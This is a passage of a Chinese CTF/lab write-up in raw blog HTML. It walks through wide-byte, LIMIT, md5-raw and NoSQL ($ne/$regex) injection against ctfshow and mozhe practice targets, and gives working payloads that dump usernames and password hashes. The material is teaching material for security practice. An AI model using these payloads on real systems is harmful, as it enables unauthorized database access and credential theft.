alt=\"在这里插入图片描述\"><br>发现更改了admin的密码，即说明注入成功<br>那他到底能有什么作用呢，我们可以通过一段php代码来体现它的作用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"../sql-connections/sql-connect.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#引用数据库连接文件</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//关闭报错</span>\n<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"SELECT * FROM users ORDER BY id\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sql语句是拿出所有数据按照id排列，即从id=1直至最后</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//此函数指的是仅执行一种语句，为了防止多个语句注入，并将结果赋值给新变量</span>\n<span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//此函数指返回结果集中行的数目，新变量$num就是这个数</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//for 循环语句,起始时变量i为0，设置条件为变量i小于变量num，即运行到变量num-1，每次执行后变量加一继续执行</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//取出变量result作为一组关联数组赋值给新变量row</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//将变量row的第一列赋值给变量username</span>\n<span class=\"token variable\">$sql_detail</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users where username='<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>'\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将变量username用单引号包裹</span>\n<span class=\"token variable\">$result_detail</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql_detail</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//仅执行一种语句，将结果赋值给新变量$result_detail</span>\n<span class=\"token variable\">$num_detail</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result_detail</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//计算变量$result_detail的行数赋值给新$num_detail</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$num_detail</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//for 循环语句，，起始时j为0，设置条件为j小于变量$num_detail，每次执行后加一继续执行</span>\n<span class=\"token variable\">$row_detail</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result_detail</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//将结果以关联数组形式联合起来，赋值给新变量</span>\n<span class=\"token keyword\">echo</span><span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;</span>END</span>\n&lt;table border=\"1\" style=\"table-layout:fixed;\" width=\"1000\">\n&lt;tr>\n&lt;th><span class=\"token interpolation\"><span class=\"token variable\">$row_detail</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></span>&lt;/th>\n&lt;th><span class=\"token interpolation\"><span class=\"token variable\">$row_detail</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></span>&lt;/th>\n&lt;/tr>\n&lt;/table>\n<span class=\"token delimiter symbol\">END<span class=\"token punctuation\">;</span></span></span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行结果为<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539273.png\" alt=\"在这里插入图片描述\"><br>用户名和密码被打印出来了！</p>\n<h2 id=\"宽字节注入-1\"><a href=\"#宽字节注入-1\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><h3 id=\"0X01-4\"><a href=\"#0X01-4\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539582.png\" alt=\"在这里插入图片描述\"><br>当我们输入<code>?id=1&#39;</code>时，发现多了一个反斜线，此时我们考虑到宽字节注入，尝试去构造一个字母与后面的\\组成汉字，我们知道%df与\\可以组成汉字<code>運</code>，构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df<span class=\"token operator\">%</span><span class=\"token number\">27</span>\n注：<span class=\"token operator\">%</span><span class=\"token number\">27</span>是单引号的url编码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539784.png\" alt=\"在这里插入图片描述\"><br>�\\ 实际上就是那个運字 ，此时我们就可以尝试进行注入<br>爆库</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df<span class=\"token operator\">%</span><span class=\"token number\">27</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539078.png\" alt=\"在这里插入图片描述\">爆表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df<span class=\"token operator\">%</span><span class=\"token number\">27</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span>\n <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><font color='red'>注:此时库名不能写<code>&#39;security&#39;</code>，因为出现了单引号，可以用<code>database()</code>或<code>十六进制</code>来进行代替</font><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539673.png\" alt=\"在这里插入图片描述\">爆列名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df<span class=\"token operator\">%</span><span class=\"token number\">27</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> \n<span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token number\">0x7573657273</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539455.png\" alt=\"在这里插入图片描述\"></p>\n<p>爆字段信息（下方以uesrs为例）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df<span class=\"token operator\">%</span><span class=\"token number\">27</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539588.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02-5\"><a href=\"#0X02-5\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p>进入靶场后<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539986.png\" alt=\"在这里插入图片描述\"><br>下方灰色处发现可以点击，点击进入<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539179.png\" alt=\"在这里插入图片描述\"><br>尝试宽字节注入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539798.png\" alt=\"在这里插入图片描述\"><br>发现报错，说明可以进行宽字节注入<br>那就开始日常的sql注入流程，判断字段数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df' <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">6</span> <span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539805.png\" alt=\"在这里插入图片描述\"><br>说明字段数为5，此时利用联合查询，看哪个有回显</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span> <span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539077.png\" alt=\"在这里插入图片描述\"><br>发现3和5有回显位，此时利用3和5来爆库并得到当前用户名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539477.png\" alt=\"在这里插入图片描述\">mozhe_discuz_stormgroup<br>此时再查表名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span>\n information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> \n table_schema<span class=\"token operator\">=</span><span class=\"token number\">0x6d6f7a68655f64697363757a5f73746f726d67726f7570</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539450.png\" alt=\"在这里插入图片描述\">同时查两个表的列名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span>\ninformation_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token number\">0x73746f726d67726f75705f6d656d626572</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> \ntable_name<span class=\"token operator\">=</span><span class=\"token number\">0x6e6f74696365</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539517.png\" alt=\"在这里插入图片描述\"><br>此时想到我们登录需要的是name和password，因此我们查询这两个字段</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">%</span>df' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span>\n information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token number\">0x73746f726d67726f75705f6d656d626572</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">status</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> \n mozhe_discuz_stormgroup<span class=\"token punctuation\">.</span>stormgroup_member<span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539878.png\" alt=\"在这里插入图片描述\"><br>得到uesrname是mozhe，此时用password对后面状态为1的进行md5解密<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539062.png\" alt=\"在这里插入图片描述\"><br>得到密码，进行登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539303.png\" alt=\"在这里插入图片描述\"><br>获取到了key，解题完成</p>\n<h2 id=\"limit注入-1\"><a href=\"#limit注入-1\" class=\"headerlink\" title=\"limit注入\"></a>limit注入</h2><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"> <span class=\"token comment\">//分页查询</span>\n  $<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> ctfshow_user <span class=\"token keyword\">limit</span> <span class=\"token punctuation\">(</span>$page<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>$<span class=\"token keyword\">limit</span><span class=\"token punctuation\">,</span>$<span class=\"token keyword\">limit</span><span class=\"token punctuation\">;</span>\n返回逻辑 \n<span class=\"token comment\">//TODO:很安全，不需要过滤</span>\n<span class=\"token comment\">//拿到数据库名字就算你赢</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?page<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">limit</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token keyword\">procedure</span> analyse<span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539422.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"md5注入\"><a href=\"#md5注入\" class=\"headerlink\" title=\"md5注入\"></a>md5注入</h2><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$username <span class=\"token operator\">=</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$password <span class=\"token operator\">=</span> md5<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>本关username声明必须为admin才能得到flag，再观察password，被md5函数包裹了<br>我们构造payload如下即可</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username: admin\t\npassword: ffifdyop<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>那此时语句就相当于是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select count(*) from ctfshow_user where username = 'admin' and password= ''or '6+其他字符'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539899.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"nosql注入-1\"><a href=\"#nosql注入-1\" class=\"headerlink\" title=\"nosql注入\"></a>nosql注入</h2><h3 id=\"0X01-5\"><a href=\"#0X01-5\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">  <span class=\"token comment\">//无</span>\n  $<span class=\"token keyword\">user</span> <span class=\"token operator\">=</span> $memcache<span class=\"token operator\">-</span><span class=\"token operator\">></span>get<span class=\"token punctuation\">(</span>$id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      \n返回逻辑\n  <span class=\"token comment\">//无过滤</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>memcache</code>是返回数组的，此时按理说传<code>?id=flag</code>就可以，不过报错了，学习其他师傅的wp后说后端进行了intval检测,这个函数吧，他是检测数字的，本地测试如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539638.png\" alt=\"在这里插入图片描述\"><br>因此我们需要构造一个数组形式，也就是<code>?id[]=flag</code>，当然二维数组的名字可以随便写，<code>?id[12345]=flag</code>也行，因为最终传入的数据是flag</p>\n<h3 id=\"0X02-6\"><a href=\"#0X02-6\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539837.png\" alt=\"在这里插入图片描述\"><br>观察语句并分析代码，发现传入的是变量data，而data中的数据是username和password，因此我们想实现成功获取flag，可以利用永真式，构造payload如下(ne是非的意思，具体见上方)</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username<span class=\"token punctuation\">[</span>$ne<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span>$ne<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时执行的实际语句就是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">&#123;\n    <span class=\"token string\">'username'</span>: &#123;\n        <span class=\"token string\">'$ne'</span>: <span class=\"token string\">'1'</span>\n    &#125;<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'password'</span>: &#123;\n        <span class=\"token string\">'$ne'</span>: <span class=\"token string\">'1'</span>\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"0X03-2\"><a href=\"#0X03-2\" class=\"headerlink\" title=\"0X03\"></a>0X03</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">//sql语句</span>\n  $query <span class=\"token operator\">=</span> new MongoDB\\Driver\\Query<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  $<span class=\"token keyword\">cursor</span> <span class=\"token operator\">=</span> $manager<span class=\"token operator\">-</span><span class=\"token operator\">></span>executeQuery<span class=\"token punctuation\">(</span><span class=\"token string\">'ctfshow.ctfshow_user'</span><span class=\"token punctuation\">,</span> $query<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>toArray<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">//返回逻辑，无过滤</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">cursor</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>&#123;\n    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'登陆成功'</span><span class=\"token punctuation\">;</span>\n    array_push<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> $flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  &#125;  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这关你利用和上关同样的姿态，会发现有admin和admin1两个用户名<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539111.png\" alt=\"在这里插入图片描述\"><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539313.png\" alt=\"在这里插入图片描述\"><br> 方法一<br>此时看似无法使用永真式注入了，但是其实你仔细观察后会发现password一致，因此我们可以更改password对应的内容，构造payload如下即可</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username<span class=\"token punctuation\">[</span>$ne<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span>$ne<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>ctfshow666nnneeaaabbbcc<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539453.png\" alt=\"在这里插入图片描述\"><br>方法二<br>正常这关的话利用的是正则匹配,因为flag的用户名可能是f开头，所以构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username<span class=\"token punctuation\">[</span>$regex<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span>$ne<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>也可以让它匹配非a开头的，构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username<span class=\"token punctuation\">[</span>$regex<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">^</span><span class=\"token 